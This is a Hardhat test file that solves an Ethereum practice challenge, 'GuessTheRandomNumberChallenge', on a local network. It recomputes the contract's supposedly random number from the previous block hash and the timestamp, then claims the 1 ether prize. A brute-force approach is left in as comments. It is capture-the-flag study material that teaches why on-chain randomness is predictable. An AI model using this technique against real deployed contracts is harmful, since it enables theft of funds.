import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers, network } from 'hardhat';
const { utils, provider } = ethers;

describe('GuessTheRandomNumberChallenge', () => {
  let target: Contract;
  let attacker: SignerWithAddress;
  let deployer: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('GuessTheRandomNumberChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {

    // First approach: Use a loop to brute force the random number since it's a uint8
    // Note: This does not work because each guess requires sending 1 ether to the contract!
    // However, it is useful for double-checking the answer.

    // let targetBalance = await provider.getBalance(target.address);
    // let randomNumber = 0;
    // for(let i = 0; i < 256; i++) {
    //   await target.guess(i, {value: utils.parseEther('1')});
    //   const newBalance = await provider.getBalance(target.address);
    //   if (newBalance.sub(targetBalance).isNegative()) {
    //     console.log(`${i}: ` , targetBalance);
    //     randomNumber = i;
    //   }
    //   targetBalance = newBalance;
    // }

    // await target.guess(randomNumber, {value: utils.parseEther('1')});

    const transactionHash = target.deployTransaction.hash;
    const currentBlock = await provider.getBlock(target.deployTransaction.blockNumber!);
    const previousBlock = await provider.getBlock(target.deployTransaction.blockNumber! - 1 ?? 0);
    const previousBlockHash = previousBlock.hash;
    const timestamp = currentBlock.timestamp;

    const keccakHash = utils.solidityKeccak256([ "bytes32", "uint256" ], [ previousBlockHash, timestamp ]);

    const answer = ethers.BigNumber.from(keccakHash).mod(256).toNumber();
    await target.guess(answer, {value: utils.parseEther('1')});

    console.log('answer: ', answer);
    // NOTE: uncomment this line to verify the answer is correct
    // console.log('random number', randomNumber);

    expect(await target.isComplete()).to.equal(true);
  });
});
